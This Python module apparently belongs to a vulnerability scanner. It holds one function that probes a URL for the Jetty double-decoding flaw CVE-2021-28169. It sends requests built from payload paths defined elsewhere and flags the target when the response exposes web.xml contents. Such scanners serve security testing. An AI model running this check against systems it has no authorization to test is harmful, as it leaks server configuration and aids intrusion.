#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2021_28169_scan(self, url):
    ''' 在版本9.4.40、10.0.2、11.0.2 之前, ConcatServlet和WelcomeFilterJetty Servlet中的类受到"双重解码"错误的影响 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'DSinfo'
    vul_info['vul_id'] = 'CVE-2021-28169'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_28169_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res                  # * 会输出一个http数据包
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
